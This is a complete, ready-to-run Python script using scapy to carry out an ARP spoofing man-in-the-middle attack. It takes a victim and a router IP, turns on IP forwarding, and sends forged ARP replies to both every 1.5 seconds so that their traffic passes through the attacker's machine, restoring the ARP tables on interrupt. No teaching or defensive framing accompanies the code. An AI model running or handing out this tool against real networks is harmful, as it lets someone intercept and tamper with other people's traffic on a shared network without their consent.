# sudo python arp_spoof.py -v 192.168.0.3 -r 192.168.0.1
#!/usr/bin/python
from scapy.all import *
import argparse
import signal
import sys
import logging
import time
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victimIP", help="Choose the victim IP address. Example: -v 192.168.0.5")
    parser.add_argument("-r", "--routerIP", help="Choose the router IP address. Example: -r 192.168.0.1")
    return parser.parse_args()
def originalMAC(host):
    # ping is optional (sends a WHO_HAS request)
    os.popen('ping -c 1 %s' % host)
    # grep with a space at the end of IP address to make sure you get a single line
    fields = os.popen('grep "%s " /proc/net/arp' % host).read().split()
    if len(fields) == 6 and fields[3] != "00:00:00:00:00:00":
        return fields[3]
    else:
        print('no response from', host)
def poison(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
def restore(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)
    sys.exit("losing...")
def main(args):
    if os.geteuid() != 0:
        sys.exit("[!] Please run as root")
    routerIP = args.routerIP
    print ('routerIP : ' + routerIP)
    victimIP = args.victimIP
    print ('victimIP : ' + victimIP)
    routerMAC = originalMAC(args.routerIP)
    print ('routerMAC : ' + routerMAC)
    #routerMAC = "00:26:66:7B:E6:89"
    #victimMAC = "8C:18:D9:2B:29:18"
    victimMAC = originalMAC(args.victimIP)
    print ('victimMAC : ' + victimMAC)
    if routerMAC == None:
        sys.exit("Could not find router MAC address. Closing....")
    if victimMAC == None:
        sys.exit("Could not find victim MAC address. Closing....")
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
        ipf.write('1\n')
    def signal_handler(signal, frame):
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
            ipf.write('0\n')
        restore(routerIP, victimIP, routerMAC, victimMAC)
    signal.signal(signal.SIGINT, signal_handler)
    while 1:
        poison(routerIP, victimIP, routerMAC, victimMAC)
        time.sleep(1.5)
main(parse_args())
